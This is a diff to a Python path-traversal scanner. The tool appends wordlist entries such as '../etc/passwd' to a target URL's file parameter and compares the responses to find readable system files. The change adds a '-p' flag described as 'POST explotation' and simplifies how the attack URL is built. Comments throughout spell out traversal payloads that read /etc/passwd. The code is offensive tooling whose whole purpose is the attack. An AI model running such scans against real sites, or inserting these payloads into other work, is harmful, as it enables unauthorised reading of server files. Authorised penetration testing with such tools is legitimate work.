@@ -63,6 +63,9 @@ parser.add_argument(
         default = 4,
         help = "Number of threads that will be executed (default = 4)")
 parser.add_argument(
+        "-p",
+        help = "POST explotation. Inform parameter")
+parser.add_argument(
         "-o", 
         help = "Save results to file")
 parser.add_argument(
@@ -106,7 +109,7 @@ def check():
     	args.u, args.v, args.UserAgent, args.timeout)
 
     #Validates input URL
-    par = conn.url()
+    conn.url()
     
     #Returns url and HTTP code
     code = conn.HTTPcode(True)
@@ -123,7 +126,7 @@ def check():
             exit()
         else:
             #returns URL, default page size, default html, parameter status
-            return(args.u, 0, "not found", par)
+            return(args.u, 0, "not found")
    
     #Get default failed injection page size
     #Returns URL and Default page size
@@ -137,7 +140,7 @@ def check():
     target_url = conn.redirect(True, True)
 
     #Returns URL, (URL, default page size), default_html, parameter status
-    return(target_url, default_p_size, default_html, par)
+    return(target_url, default_p_size, default_html)
 
 def wordlist():
     """
@@ -159,7 +162,6 @@ def test(target_info, wlist):
     target = target_info[0]
     p_size_default = target_info[1]
     p_html_default = target_info[2]
-    parameter = target_info[3]
 
     #Will go through all the lines in the wordlist
     for directory in wlist:
@@ -176,40 +178,23 @@ def test(target_info, wlist):
             
             #Here the final URL will be treated. This way we can assure the
             #Right URL and payload will be passed
-            #If URL has a parameter, it must be different of the one without it
-            if parameter == True:
-                #Check if target URL finishs with "/"
-                # site.com/index.php?file=     ../etc/passwd
-                if directory[0] != "/":
-                    if target[-1] != "/":
-                        #Final target becomes
-                        #site.com/index.php?file=../etc/passwd
-                        final_target = target + directory
-                    #If site.com/index.php?file=/  ../etc/passwd
-                    else:
-                        #Final target becomes
-                        #site.com/index.php?file=../etc/passwd
-                        final_target = target[:-1] + directory
-                # site.com/index.php?file=     /../etc/passwd
+            #Check if target URL finishs with "/"
+            # site.com/index.php?file=     ../etc/passwd
+            if directory[0] != "/":
+                if target[-1] != "/":
+                    #Final target becomes
+                    #site.com/index.php?file=../etc/passwd
+                    final_target = target + directory
+                #If site.com/index.php?file=/  ../etc/passwd
                 else:
                     #Final target becomes
                     #site.com/index.php?file=../etc/passwd
-                    final_target = target + directory[1:]
-            #If it has no parameter
+                    final_target = target[:-1] + directory
+            # site.com/index.php?file=     /../etc/passwd
             else:
-                #Check if directory ends with "/"
-                #site.com/dir/  /../etc/passwd
-                if directory[0] != "/":
-                    #This site.com/dir  ../etc/passwd
-                    if target[-1] != "/":
-                        #becames site.com/dir/../etc/passwd
-                        final_target = target + "/" + directory
-                    else:
-                        final_target = target + directory
-                else:
-                    if target[-1] == "/":
-                        final_target = target[:-1] + directory
-
+                #Final target becomes
+                #site.com/index.php?file=../etc/passwd
+                final_target = target + directory[1:]
 
             if args.RandomAgent == True:
                 args.UserAgent = useragents.generate()
